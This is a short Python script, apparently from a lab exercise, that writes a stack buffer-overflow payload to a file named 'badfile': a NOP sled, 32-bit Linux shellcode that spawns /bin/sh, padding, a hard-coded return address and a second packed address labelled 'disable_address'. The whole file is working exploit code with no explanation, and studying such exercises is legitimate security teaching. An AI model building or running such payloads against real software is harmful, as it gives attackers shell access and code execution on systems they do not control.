
import struct

buffer_len = 273
shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
disable_address = struct.pack("I", 0x804852b)

payload1 = '\x90' * 10   
payload1 += shellcode 
payload1 += '\x90' * (136- len(payload1)) #offset di 16
payload1 += struct.pack("I", 0xbffff1b8)


offset = buffer_len - (len(payload1))
payload2 = "B" * (offset)
payload2 += disable_address

payload = payload1 + payload2

with open("badfile", "wb") as f:
	f.write(payload)

